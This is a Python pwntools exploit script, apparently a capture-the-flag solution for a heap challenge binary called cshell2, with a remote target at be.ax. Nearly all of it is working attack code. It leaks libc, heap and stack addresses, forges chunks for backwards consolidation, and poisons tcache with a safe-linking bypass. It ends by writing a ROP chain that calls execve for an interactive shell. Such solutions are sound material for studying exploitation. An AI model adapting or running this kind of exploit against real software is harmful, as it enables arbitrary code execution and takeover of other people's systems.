#!/usr/bin/env python2
from pwn import *

# Definitions
e = context.binary = ELF('./cshell2',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
context.terminal = ['terminator','-e']

if args.REMOTE:
    io = remote('be.ax',31667)
else:
    io = process(e.path)

# Exploit
def add(i, l=1032, fname='', mname='', lname='', age=666, bio=''):
    io.recvrepeat(0.1)
    io.sendline('1')
    io.recvrepeat(0.1)
    io.sendline(str(i))
    io.recvrepeat(0.1)
    io.sendline(str(l))
    io.recvrepeat(0.1)
    io.sendline(fname)
    io.recvrepeat(0.1)
    io.sendline(mname)
    io.recvrepeat(0.1)
    io.sendline(lname)
    io.recvrepeat(0.1)
    io.sendline(str(age))
    io.recvrepeat(0.1)
    io.sendline(bio)

def show(i):
    io.sendlineafter('er\n','2')
    io.sendlineafter(': \n',str(i))

def delete(i):
    io.recvrepeat(0.1)
    io.sendline('3')
    io.recvrepeat(0.1)
    io.sendline(str(i))

def edit(i, fname='', mname='', lname='', age=666, bio=''):
    io.recvrepeat(0.1)
    io.sendline('4')
    io.recvrepeat(0.1)
    io.sendline(str(i))
    io.recvrepeat(0.1)
    io.sendline(fname)
    io.recvrepeat(0.1)
    io.sendline(mname)
    io.recvrepeat(0.1)
    io.sendline(lname)
    io.recvrepeat(0.1)
    io.sendline(str(age))
    io.recvrepeat(0.1)
    io.sendline(bio)

def reage(i, age):
    io.recvrepeat(0.1)
    io.sendline('5')
    io.recvrepeat(0.1)
    io.sendline(str(i))
    io.recvrepeat(0.1)
    io.sendline(str(age))


# Exploit
def safe_enc_ptr(p, l): # Bypass safe-linking
    return p ^ (l>>12)

def leak():
    show(5)
    io.recvuntil('last: ')
    raw_leak = io.recv(4).ljust(8,'\0')
    list_leak = list(raw_leak)
    if list_leak[3] == '\x20':
        list_leak[3] = '\0'
        raw_leak = ''.join(list_leak)
    heap_leak = u64(raw_leak) - 0xa0a
    io.recvuntil('first: ')
    libc_leak = u64(io.recv(6).ljust(8,'\0')) - 0x1c820a
    return libc_leak, heap_leak

def leak_stack():
    show(3)
    io.recvuntil('first: ')
    return u64(io.recv(6).ljust(8,'\0'))


def pwn():

    # Reshape heap to realign corrupted off
    add(0, 1032)
    add(1)
    add(2,2040)
    add(3,2080)
    add(4)
    delete(2)
    delete(3)
    add(5,0x810)

    # Leak libc and heap with uninitialized data
    libc.address, heap_base = leak()
    log.success('Libc: ' + hex(libc.address))
    log.success('Heap: ' + hex(heap_base))

    # Backwards consolidation
    fake_chunk = flat(
        0,
        0xff1,
        heap_base+0x2e0,
        heap_base+0x2e0,
        heap_base+0x2e0,
        heap_base+0x2e0
    )

    edit(0, '','','',0, fake_chunk) # Fake chunk
    add(6, 0x800) # Overwrite size
    edit(5, '','','',0, 2000*'A'+p64(0xff0)+p64(0x810)) # Fake prev_size
    delete(6)

    # Poisong tcache - overwrite chunk_arr
    add(7)
    delete(0)
    delete(1)
    edit(7, '','','',0, (1000-104)*'A'+p64(safe_enc_ptr(0x4040b0,heap_base+0x6b0)))
    add(8)
    add(9)

    # Leak stack
    edit(9, '','','',0, p64(libc.sym['environ'])+p64(8))
    stack_leak = leak_stack()

    ret_addr = stack_leak - 0x180
    log.success('Ret addr: ' + hex(ret_addr))

    # ROP
    rop = ROP(libc)
    rop.execve(libc.address+0x189fff, 0, 0)

    edit(9, '','','',0, p64(ret_addr-64)+p64(0x408))
    edit(3, '','','',0, rop.chain())

pwn()
io.interactive()
